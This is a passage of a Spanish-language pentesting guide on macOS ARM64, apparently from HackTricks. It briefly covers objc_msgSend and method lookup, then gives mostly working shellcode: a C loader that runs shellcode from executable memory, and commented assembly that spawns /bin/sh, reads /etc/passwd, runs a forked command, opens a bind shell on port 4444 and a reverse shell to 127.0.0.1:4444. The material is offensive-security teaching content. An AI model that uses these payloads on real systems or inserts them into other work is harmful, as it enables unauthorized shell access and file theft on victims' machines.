(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Configurando la variable de entorno **`NSObjCMessageLoggingEnabled=1`** es posible registrar cuándo se llama a esta función en un archivo como `/tmp/msgSends-pid`.
>
> Además, configurando **`OBJC_HELP=1`** y llamando a cualquier binario puedes ver otras variables de entorno que podrías usar para **log** cuando ocurren ciertas acciones de Objc-C.

Cuando se llama a esta función, es necesario encontrar el método llamado de la instancia indicada, para esto se realizan diferentes búsquedas:

- Realizar búsqueda optimista en caché:
- Si tiene éxito, hecho
- Adquirir runtimeLock (lectura)
- Si (realizar && !cls->realized) realizar clase
- Si (inicializar && !cls->initialized) inicializar clase
- Intentar caché propia de la clase:
- Si tiene éxito, hecho
- Intentar lista de métodos de la clase:
- Si se encuentra, llenar caché y hecho
- Intentar caché de la superclase:
- Si tiene éxito, hecho
- Intentar lista de métodos de la superclase:
- Si se encuentra, llenar caché y hecho
- Si (resolver) intentar resolver método, y repetir desde la búsqueda de clase
- Si aún está aquí (= todo lo demás ha fallado) intentar reenvío

### Shellcodes

Para compilar:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Para extraer los bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Para macOS más reciente:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C código para probar el shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Tomado de [**aquí**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) y explicado.

{{#tabs}}
{{#tab name="con adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="con pila"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="con adr para linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Leer con cat

El objetivo es ejecutar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, por lo que el segundo argumento (x1) es un array de parámetros (que en memoria significa una pila de las direcciones).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Invocar comando con sh desde un fork para que el proceso principal no sea terminado
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell de [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) en **puerto 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Shell inversa

Desde [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell a **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
